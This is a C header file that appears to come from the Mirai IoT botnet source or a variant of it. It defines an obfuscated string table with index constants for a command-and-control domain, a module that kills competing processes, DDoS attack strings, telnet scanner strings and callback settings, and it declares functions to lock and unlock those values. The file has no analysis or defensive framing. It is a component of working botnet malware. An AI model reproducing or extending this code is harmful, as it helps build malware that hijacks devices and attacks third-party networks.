#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_EXEC_SUCCESS 1
#define TABLE_EXEC_SUCCESS2 2
#define TABLE_CNC_DOMAIN 3
#define TABLE_KILLER_PROC 4
#define TABLE_KILLER_EXE 5
#define TABLE_KILLER_DELETED 6
#define TABLE_KILLER_FD 7
#define TABLE_KILLER_MAPS 8
#define TABLE_KILLER_TCP 9
#define TABLE_KILLER_MASUTA 10
#define TABLE_KILLER_UPX 11
#define TABLE_MAPS_MIRAI 12
#define TABLE_ATK_VSE 13
#define TABLE_ATK_RESOLVER 14
#define TABLE_ATK_NSERV 15
#define TABLE_MISC_WATCHDOG 16
#define TABLE_MISC_WATCHDOG2 17
#define TABLE_SCAN_SHELL 18
#define TABLE_SCAN_ENABLE 19
#define TABLE_SCAN_SYSTEM 20
#define TABLE_SCAN_QUERY 21
#define TABLE_SCAN_SH 22
#define TABLE_SCAN_RESP 23
#define TABLE_SCAN_NCORRECT 24
#define TABLE_SCAN_CB_DOMAIN 25
#define TABLE_SCAN_CB_PORT 26
#define TABLE_SCAN_PS 27
#define TABLE_SCAN_KILL_9 28
#define TABLE_MISC_RANDSTRING 29
#define TABLE_MAX_KEYS 30

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
